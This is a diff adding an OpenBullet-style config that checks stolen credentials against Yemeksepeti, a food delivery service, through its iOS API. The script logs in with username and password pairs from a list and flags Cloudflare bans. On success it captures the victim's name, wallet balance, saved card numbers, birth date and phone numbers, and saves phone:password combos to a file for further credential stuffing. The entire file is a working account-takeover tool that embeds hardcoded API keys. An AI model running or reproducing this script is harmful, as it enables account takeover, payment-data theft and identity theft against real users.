@@ -1,0 +1,288 @@
+[SETTINGS]
+{
+  "Name": "YemekSepeti iOS Api",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-01-29T01:56:17.3072777+03:00",
+  "AdditionalInfo": "",
+  "Author": " e a m",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://token.yemeksepeti.com/OpenAuthentication/OAuthService.svc/Login" 
+  CONTENT "{\"password\":\"<PASS>\",\"userName\":\"<USER>\",\"culture\":\"tr-TR\",\"apiKey\":\"6669AA34-F259-48E4-8562-5D039AD1DB35\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: token.yemeksepeti.com" 
+  HEADER "Accept: */*" 
+  HEADER "AppVersionCode: 70003" 
+  HEADER "AppVersion: iOSv7.0.3" 
+  HEADER "Accept-Language: tr-TR,tr;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/json; charset=UTF-8" 
+  HEADER "DeviceId: 12F2D28B-EA84-4C08-BCD3-EC2BB990EBCF" 
+  HEADER "User-Agent: Yemeksepeti/607 CFNetwork/1327.0.4 Darwin/21.2.0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 127" 
+  HEADER "Cookie: __cf_bm=sKuZzBmzsB8iCAI2QgVSXHYUVEqMOygvpB5gbftpC88-1643322460-0-ARXeN6lyTqnrOMwukgPt/mVVnAL8xzr5dki08TpIbllfsVuEWQv0Q/cl63GfyfYVtvKxy3R7G2/XwT1DFfb2WPo=" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Hatalı giriş. Lütfen kullanıcı adınızı ve şifrenizi kontrol edip tekrar deneyiniz" 
+  KEYCHAIN Ban OR 
+    KEY "used Cloudflare to restrict access" 
+    KEY "Attention Required! | Cloudflare" 
+    KEY "error code: 10" 
+  KEYCHAIN Success OR 
+    KEY "UserName\":\"" 
+
+PARSE "<SOURCE>" JSON "UserName" CreateEmpty=FALSE -> CAP "Kullanıcı Adı" 
+
+PARSE "<SOURCE>" JSON "Name" CreateEmpty=FALSE -> CAP "İsim" 
+
+PARSE "<SOURCE>" JSON "Surname" CreateEmpty=FALSE -> CAP "Soyisim" 
+
+PARSE "<SOURCE>" LR "TokenId\":\"" "\"" -> VAR "token" 
+
+PARSE "<COOKIES(__cf_bm)>" LR "" "" -> VAR "__cf_bm" 
+
+REQUEST POST "https://gameapicore.yemeksepeti.com/v1/user/token" 
+  CONTENT "{\"culture\":\"tr-TR\",\"gameApiKey\":\"3d0db78e-ad46-496a-b61e-1329c3d7269c\",\"catalogName\":\"TR_YALOVA\",\"token\":\"<token>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: gameapicore.yemeksepeti.com" 
+  HEADER "Accept: */*" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cookie: __cf_bm=<__cf_bm>" 
+  HEADER "Accept-Language: tr-TR,tr;q=0.9" 
+  HEADER "Content-Length: 140" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "User-Agent: Yemeksepeti/607 CFNetwork/1327.0.4 Darwin/21.2.0" 
+
+FUNCTION Constant "<SOURCE>" -> VAR "auth" 
+
+REQUEST GET "https://gameapicore.yemeksepeti.com/v1/user/point/0" 
+  
+  HEADER "Host: gameapicore.yemeksepeti.com" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <auth>" 
+  HEADER "AppVersionCode: 70003" 
+  HEADER "AppVersion: iOSv7.0.3" 
+  HEADER "Accept-Language: tr-TR,tr;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/json" 
+  HEADER "DeviceId: 12F2D28B-EA84-4C08-BCD3-EC2BB990EBCF" 
+  HEADER "User-Agent: Yemeksepeti/607 CFNetwork/1327.0.4 Darwin/21.2.0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cookie: __cf_bm=" 
+
+FUNCTION Constant "<SOURCE>" -> CAP "Puan" 
+
+REQUEST POST "https://oauthcore.yemeksepeti.com/v1/oauth/authorize?grant_type=client_credentials&client_id=6669AA34-F259-48E4-8562-5D039AD1DB35" 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: oauthcore.yemeksepeti.com" 
+  HEADER "Accept: */*" 
+  HEADER "YS-ClientId: 6669AA34-F259-48E4-8562-5D039AD1DB35" 
+  HEADER "YS-VersionName: 7.0.3" 
+  HEADER "YS-Culture: tr-TR" 
+  HEADER "AppVersionCode: 70003" 
+  HEADER "Accept-Language: tr-TR,tr;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Content-Length: 0" 
+  HEADER "User-Agent: Yemeksepeti/607 CFNetwork/1327.0.4 Darwin/21.2.0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "YS-Catalog: TR_YALOVA" 
+  HEADER "Cookie: __cf_bm=<__cf_bm>" 
+
+PARSE "<SOURCE>" LR "{\"access_token\":\"" "\"" -> VAR "access_token" 
+
+PARSE "<SOURCE>" LR "refresh_token\":\"" "\"" -> VAR "refresh_token" 
+
+REQUEST POST "https://oauthcore.yemeksepeti.com/v1/oauth/refresh-token-custom" 
+  CONTENT "{\"RefreshToken\":\"<refresh_token>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: oauthcore.yemeksepeti.com" 
+  HEADER "Accept: */*" 
+  HEADER "YS-ClientId: 6669AA34-F259-48E4-8562-5D039AD1DB35" 
+  HEADER "YS-VersionName: 7.0.3" 
+  HEADER "YS-Culture: tr-TR" 
+  HEADER "AppVersionCode: 70003" 
+  HEADER "Authorization: Bearer <access_token>" 
+  HEADER "Accept-Language: tr-TR,tr;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Content-Length: 51" 
+  HEADER "User-Agent: Yemeksepeti/607 CFNetwork/1327.0.4 Darwin/21.2.0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "YS-Catalog: TR_YALOVA" 
+  HEADER "Cookie: __cf_bm=<__cf_bm>" 
+
+PARSE "<SOURCE>" LR "{\"access_token\":\"" "\"" -> VAR "access_token1" 
+
+REQUEST GET "https://gate.yemeksepeti.com/payment/api/v1/Cuzdan/campaign" 
+  
+  HEADER "Host: gate.yemeksepeti.com" 
+  HEADER "Accept: */*" 
+  HEADER "YS-ClientId: 6669AA34-F259-48E4-8562-5D039AD1DB35" 
+  HEADER "YS-VersionName: 7.0.3" 
+  HEADER "YS-Culture: tr-TR" 
+  HEADER "AppVersionCode: 70003" 
+  HEADER "Authorization: Bearer <access_token1>" 
+  HEADER "Accept-Language: tr-TR,tr;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/json" 
+  HEADER "User-Agent: Yemeksepeti/607 CFNetwork/1327.0.4 Darwin/21.2.0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "YS-Catalog: TR_YALOVA" 
+  HEADER "Cookie: __cf_bm=<__cf_bm>" 
+
+PARSE "<SOURCE>" JSON "TotalBalance" CreateEmpty=FALSE -> CAP "Bakiye" "" " ₺" 
+
+REQUEST POST "https://api.yemeksepeti.com/YS.WebServices/PaymentService.svc/GetCustomerCreditCards" 
+  CONTENT "{\"selectedAddressId\":\"\",\"ysRequest\":{\"CatalogName\":\"TR_YALOVA\",\"Token\":\"<token>\",\"ApiKey\":\"6669AA34-F259-48E4-8562-5D039AD1DB35\",\"Culture\":\"tr-TR\"},\"trackingNumber\":\"\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: api.yemeksepeti.com" 
+  HEADER "Accept: */*" 
+  HEADER "AppVersionCode: 70003" 
+  HEADER "AppVersion: iOSv7.0.3" 
+  HEADER "Accept-Language: tr-TR,tr;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/json; charset=UTF-8" 
+  HEADER "DeviceId: 12F2D28B-EA84-4C08-BCD3-EC2BB990EBCF" 
+  HEADER "User-Agent: Yemeksepeti/607 CFNetwork/1327.0.4 Darwin/21.2.0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 193" 
+  HEADER "Cookie: __cf_bm=<__cf_bm>" 
+
+PARSE "<SOURCE>" JSON "Pan" Recursive=TRUE CreateEmpty=FALSE -> CAP "Kayıtlı Kartlar" 
+
+REQUEST GET "https://gameapicore.yemeksepeti.com/v1/user/anniversaryyear/0" 
+  
+  HEADER "Host: gameapicore.yemeksepeti.com" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <auth>" 
+  HEADER "AppVersionCode: 70003" 
+  HEADER "AppVersion: iOSv7.0.3" 
+  HEADER "Accept-Language: tr-TR,tr;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/json" 
+  HEADER "DeviceId: 12F2D28B-EA84-4C08-BCD3-EC2BB990EBCF" 
+  HEADER "User-Agent: Yemeksepeti/607 CFNetwork/1327.0.4 Darwin/21.2.0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cookie: __cf_bm=<__cf_bm>" 
+
+FUNCTION Constant "<SOURCE> yıl önce" -> CAP "Kayıt Tarihi" 
+
+REQUEST POST "https://api.yemeksepeti.com/YS.WebServices/UserService.svc/GetCurrentUserInfo" 
+  CONTENT "{\"ysRequest\":{\"ApiKey\":\"6669AA34-F259-48E4-8562-5D039AD1DB35\",\"CatalogName\":\"TR_YALOVA\",\"Culture\":\"tr-TR\",\"Token\":\"<token>\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: api.yemeksepeti.com" 
+  HEADER "Accept: */*" 
+  HEADER "AppVersionCode: 70003" 
+  HEADER "AppVersion: iOSv7.0.3" 
+  HEADER "Accept-Language: tr-TR,tr;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/json; charset=UTF-8" 
+  HEADER "DeviceId: 12F2D28B-EA84-4C08-BCD3-EC2BB990EBCF" 
+  HEADER "User-Agent: Yemeksepeti/607 CFNetwork/1327.0.4 Darwin/21.2.0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 150" 
+  HEADER "Cookie: __cf_bm=<__cf_bm>" 
+
+PARSE "<SOURCE>" JSON "BirthDate" CreateEmpty=FALSE -> CAP "Doğum Günü" 
+
+PARSE "<SOURCE>" JSON "IsVodafone" -> VAR "vodafone" 
+
+FUNCTION Translate 
+  KEY "true" VALUE "✔️" 
+  KEY "false" VALUE "❌" 
+  "<vodafone>" -> CAP "Vodafone Kullanıcısı Mı?" 
+
+PARSE "<SOURCE>" JSON "ConfirmedNumber" CreateEmpty=FALSE -> CAP "Onaylanmış Nummara" 
+
+PARSE "<SOURCE>" JSON "MobilePhone" CreateEmpty=FALSE -> CAP "Mobil Numarası" 
+
+PARSE "<SOURCE>" JSON "VodafonePhoneNumber" CreateEmpty=FALSE -> CAP "Vodafone'a Bağlı Numara" 
+
+PARSE "<SOURCE>" JSON "TelephoneNumber" CreateEmpty=FALSE -> CAP "Kampanyada Kullanılan Telefon Numarası" 
+
+PARSE "<SOURCE>" JSON "RegisterDate" CreateEmpty=FALSE -> CAP "Kayıt Tarihi" 
+
+PARSE "<SOURCE>" JSON "RegisterTime" CreateEmpty=FALSE -> CAP "Kayıt Saati" 
+
+FUNCTION Replace "(" "" "<Mobil Numarası>" -> VAR "Mobil Numarası1" 
+
+FUNCTION Replace ")" "" "<Mobil Numarası1>" -> VAR "Mobil Numarası2" 
+
+FUNCTION Replace " " "" "<Mobil Numarası2>" -> VAR "TEL1" 
+
+FUNCTION Replace "(" "" "<Kampanyada Kullanılan Telefon Numarası>" -> VAR "Kampanyada Kullanılan Telefon Numarası1" 
+
+FUNCTION Replace ")" "" "<Kampanyada Kullanılan Telefon Numarası1>" -> VAR "Kampanyada Kullanılan Telefon Numarası2" 
+
+FUNCTION Replace " " "" "<Kampanyada Kullanılan Telefon Numarası2>" -> VAR "TEL2" 
+
+FUNCTION Length "<TEL1><TEL2>" -> VAR "TELLE" 
+
+IF "<TELLE>" EqualTo "20"
+
+UTILITY File "DB\\Yemeksepeti-TELPASS-EAM.txt" AppendLines "<TEL1>:<PASS>\\n<TEL2>:<PASS>" 
+
+FUNCTION Constant " DB>>Yemeksepeti-TELPASS-EAM.txt" -> CAP "TelPass" 
+
+ENDIF
+IF "<TELLE>" EqualTo "16"
+
+UTILITY File "DB\\Yemeksepeti-TELPASS-EAM.txt" AppendLines "<TEL1>:<PASS>" 
+
+FUNCTION Constant " DB>>Yemeksepeti-TELPASS-EAM.txt" -> CAP "TelPass" 
+
+ENDIF
+IF "<TELLE>" EqualTo "12"
+
+FUNCTION Constant "Telefon Numarası Bulunmadığı İçin TelPass Üretilmemiştir" -> CAP "TelPass" 
+
+ENDIF
+
